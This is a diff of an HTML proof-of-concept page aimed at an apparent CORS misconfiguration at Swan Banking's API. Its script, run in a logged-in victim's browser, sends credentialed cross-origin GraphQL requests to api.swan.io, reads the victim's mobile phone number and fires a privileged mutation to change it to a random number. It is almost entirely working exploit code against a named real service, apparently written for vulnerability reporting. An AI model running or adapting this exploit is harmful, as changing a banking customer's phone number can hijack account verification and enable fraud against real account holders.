@@ -1,59 +1,83 @@
 <!DOCTYPE html>
-<meta charset="utf-8">
-<title>Swan CORS Critical PoC</title>
-<style>
-  body { font-family: system-ui; margin: 2rem; }
-  pre  { background:#f8f8f8; padding:1rem; border:1px solid #ddd; }
-</style>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Swan CORS Critical PoC</title>
+  <style>
+    body { font-family: system-ui; margin: 2rem; color: #111 }
+    pre  { background: #f8f8f8; padding: 1rem; border: 1px solid #ddd; overflow: auto }
+    code { color: #c7254e; background: #f9f2f4; padding: 0.2em 0.4em }
+  </style>
+</head>
+<body>
+  <h2>⚠️ Swan Banking – Critical CORS Misconfiguration PoC ⚠️</h2>
+  <p>
+    Hosted on <strong id="origin"></strong>.<br>
+    <em>Make sure you’re logged-in at <code>dashboard.swan.io</code> in this browser, then reload.</em>
+  </p>
+  <pre id="log">Running…</pre>
 
-<h2>⚠️ Swan CORS Misconfiguration PoC ⚠️</h2>
-<p>
-  Hosted on <strong id="origin"></strong>.  
-  Must be tested **after** logging in at <code>dashboard.swan.io</code>.
-</p>
-<pre id="log">Running…</pre>
+  <script>
+    // helper to append to our log
+    const log = line => {
+      document.getElementById('log').textContent += line + '\n';
+    };
+    // show our page origin
+    document.getElementById('origin').textContent = location.origin;
 
-<script>
-  document.getElementById('origin').textContent = location.origin;
-  const log = line => document.getElementById('log').textContent += line + '\n';
-
-  async function gql(path, query) {
-    const res = await fetch(`https://api.swan.io${path}`, {
-      method: 'POST',
-      credentials: 'include',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ query })
-    });
-    const text = await res.text();
-    log(`=== ${path} ===\nStatus: ${res.status}\n${text}\n`);
-    return JSON.parse(text).data;
-  }
-
-  (async () => {
-    // 1) prove cookie is sent & accepted
-    const who = await gql('/admin-auth/graphql', '{ user { mobilePhoneNumber } }');
-    if (!who || !who.user) {
-      log('🔒 Not logged in or cookie not sent – please sign in at dashboard.swan.io and reload.');
-      return;
+    // simple GraphQL fetch with credentials
+    async function gql(path, query) {
+      const res = await fetch(`https://api.swan.io${path}`, {
+        method:      'POST',
+        credentials: 'include',    // <-- sends swan_session_id cookie
+        headers:     { 'Content-Type': 'application/json' },
+        body:        JSON.stringify({ query })
+      });
+      const txt = await res.text();
+      log(`=== ${path} ===\nStatus: ${res.status} ${res.statusText}\n${txt}\n`);
+      return JSON.parse(txt).data;
     }
-    const oldN = who.user.mobilePhoneNumber;
-    log(`✅ Victim’s phone: ${oldN}\n`);
 
-    // 2) perform admin mutation
-    const rand = Math.floor(1e7 + Math.random()*9e7);
-    const newN = '+336' + String(rand).slice(1);
-    log(`▶ Changing ${oldN} → ${newN}`);
-    await gql('/admin-auth/graphql', `
-      mutation {
-        startPhoneNumberModification(input:{
-          oldPhoneNumber:"${oldN}",
-          newPhoneNumber:"${newN}"
-        }) {
-          __typename
-          ... on StartPhoneNumberModificationSuccessPayload { phoneNumberModification{id} }
-          ... on PhoneNumberModificationAlreadyExistsRejection { message }
-          ... on TooManyPhoneNumberModificationRejection { message }
-        }
-      }`);
-  })();
-</script>
+    (async () => {
+      // 1) Read the victim’s number (no `id` needed here)
+      const whoami = await gql(
+        '/admin-auth/graphql',
+        '{ user { mobilePhoneNumber } }'
+      );
+
+      if (!whoami || !whoami.user) {
+        log('🔒 Not logged in: please sign in at dashboard.swan.io and reload.');
+        return;
+      }
+
+      const oldN = whoami.user.mobilePhoneNumber;
+      log(`✅ Victim’s phone: ${oldN}\n`);
+
+      // 2) Generate a valid new number: +33 6 XXXXXXXX
+      const rand8 = () => Math.floor(10000000 + Math.random() * 90000000);
+      const newN  = '+336' + String(rand8()).slice(1);
+      log(`▶ Attempting change from ${oldN} → ${newN}\n`);
+
+      // 3) Fire the privileged mutation
+      await gql(
+        '/admin-auth/graphql',
+        `
+          mutation {
+            startPhoneNumberModification(input:{
+              oldPhoneNumber:"${oldN}",
+              newPhoneNumber:"${newN}"
+            }) {
+              __typename
+              ... on StartPhoneNumberModificationSuccessPayload {
+                phoneNumberModification { id }
+              }
+              ... on PhoneNumberModificationAlreadyExistsRejection { message }
+              ... on TooManyPhoneNumberModificationRejection { message }
+            }
+          }
+        `
+      );
+    })();
+  </script>
+</body>
+</html>
